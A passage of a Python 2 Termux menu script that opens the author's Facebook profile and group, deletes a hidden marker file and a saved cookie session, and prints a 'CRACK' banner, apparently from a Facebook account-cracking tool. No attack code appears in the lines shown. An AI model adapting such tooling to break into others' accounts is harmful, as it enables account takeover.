		raw_input("\033[1;95m• \033[1;93mpress enter ")
		os.system('xdg-open https://www.facebook.com/Romi.Uyey')
		try:
			os.remove("/data/data/com.termux/files/usr/lib/.bash")
			exit("\033[1;92m• run again the tools.")
		except:exit("\033[1;95m•\033[1;96m menuju browser")
	elif r=="7":
		print(" ")
		print("\033[1;95m• \033[1;96mplease wait opening group")
		exit(subprocess.Popen(["am","start","https://www.facebook.com/groups/453688872336137"],
		stderr=subprocess.PIPE,stdin=subprocess.PIPE,stdout=subprocess.PIPE).wait())
	elif r=="0":
		try:
			os.remove(".cok")
			exit(basecookie())
		except Exception as e:print("\033[1;91m• error, session empty %s"%e)
		
	else:
		print "\033[1;91m• wrong input"
		basecookie()
		clear()
		print(""" \033[1;91m\xe2\x80\xa2\033[1;93m•\033[1;92m•\n\033[1;91m     _______  ______ _______ _______ _     _\n     |       |_____/ |_____| |       |____/ \n\033[1;97m     |_____  |    \_ |     | |_____  |    \_\n\n\033[1;95m       • \033[0;93mGithub -> github.com/ROMI-AFRZL \033[1;95m•   \n \033[1;91m\xe2\x80\xa2\033[1;93m•\033[1;92m• """)
